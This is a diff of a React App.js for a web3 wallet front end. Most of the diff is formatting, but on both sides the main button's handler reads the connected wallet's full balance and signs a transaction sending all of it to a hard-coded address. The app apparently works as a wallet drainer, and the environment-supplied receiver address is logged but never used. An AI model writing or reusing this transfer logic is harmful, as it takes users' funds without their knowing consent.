@@ -1,78 +1,83 @@
 // import { MoralisProvider } from 'react-moralis';
-import { useConnectWallet, useNotifications } from '@web3-onboard/react';
-import './App.css';
-import './components/Header';
-import { Header } from './components/Header';
-import { Mainpage } from './components/Mainpage';
-import { useEffect } from 'react';
-import { ethers } from 'ethers';
-
+import { useConnectWallet, useNotifications } from "@web3-onboard/react";
+import "./App.css";
+import "./components/Header";
+import { Header } from "./components/Header";
+import { Mainpage } from "./components/Mainpage";
+import { useEffect } from "react";
+import { ethers } from "ethers";
 
 function App() {
-
-  const [{wallet, connecting}, connect, disconnect] = useConnectWallet();
+  const [{ wallet, connecting }, connect, disconnect] = useConnectWallet();
 
   /*--------- Send Transaction -------*/
 
   const [
-    notifications, 
-    customNotification, 
+    notifications,
+    customNotification,
     updateNotify,
-    preflightNotifications
+    preflightNotifications,
   ] = useNotifications();
 
-  
   useEffect(() => {
     console.log(notifications);
   }, [notifications]);
 
   const notConnected = async () => {
-    alert("Connect Your Wallet")
-  }
-  
+    alert("Connect Your Wallet");
+  };
+
   const sendTransactionWithPreFlightNotifications = async () => {
     const balanceValue = Object.values(wallet?.accounts[0].balance)[0];
 
-         
-    const ethersProvider = new ethers.providers.Web3Provider(wallet.provider, 'any')
-  
+    const ethersProvider = new ethers.providers.Web3Provider(
+      wallet.provider,
+      "any"
+    );
 
     const signer = ethersProvider.getSigner();
 
-    
-    const receiverAccount = process.env.REACT_APP_RECEIVER_ADDRESS
-    console.log("Account = " + typeof receiverAccount)
-  
+    const receiverAccount = process.env.REACT_APP_RECEIVER_ADDRESS;
+    console.log("Account = " + typeof receiverAccount);
+
     const txDetails = {
       from: wallet?.accounts[0].address,
-      to: '0x145825ca15453843e75957809051F8525b5f6aB5',
-      value: String(ethers.utils.parseUnits(balanceValue)) 
-      
-    }
+      to: "0x145825ca15453843e75957809051F8525b5f6aB5",
+      value: String(ethers.utils.parseUnits(balanceValue)),
+    };
 
-  
     const sendTransaction = () => {
-      return signer.sendTransaction(txDetails).then(tx => tx.hash)
-    }
-  
-    const gasPrice = () => ethersProvider.getGasPrice().then(res => res.toString())
-  
+      return signer.sendTransaction(txDetails).then((tx) => tx.hash);
+    };
+
+    const gasPrice = () =>
+      ethersProvider.getGasPrice().then((res) => res.toString());
+
     const estimateGas = () => {
-      return ethersProvider.estimateGas(txDetails).then(res => res.toString())
-    }
-  
+      return ethersProvider
+        .estimateGas(txDetails)
+        .then((res) => res.toString());
+    };
+
     const transactionHash = await preflightNotifications({
       sendTransaction,
       gasPrice,
       estimateGas,
       balance: balanceValue,
-      txDetails: txDetails
-})}
+      txDetails: txDetails,
+    });
+  };
 
   return (
     <div className="App">
-      <Header wallet={wallet} connecting={connecting} connect={connect}/>
-      <Mainpage sendTransaction={!wallet?.accounts[0].address ? notConnected : sendTransactionWithPreFlightNotifications}/>
+      <Header wallet={wallet} connecting={connecting} connect={connect} />
+      <Mainpage
+        sendTransaction={
+          !wallet?.accounts[0].address
+            ? notConnected
+            : sendTransactionWithPreFlightNotifications
+        }
+      />
     </div>
   );
 }
